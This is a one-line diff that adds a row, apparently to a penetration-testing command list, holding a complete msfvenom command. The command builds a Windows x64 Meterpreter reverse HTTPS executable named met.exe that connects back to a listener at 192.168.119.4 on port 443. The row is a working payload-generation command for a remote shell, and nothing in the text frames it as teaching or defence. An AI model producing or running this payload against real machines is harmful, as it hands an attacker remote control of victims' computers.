@@ -1,0 +1,1 @@
+payload,msfvenom,msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.119.4 LPORT=443 -f exe -o met.exe
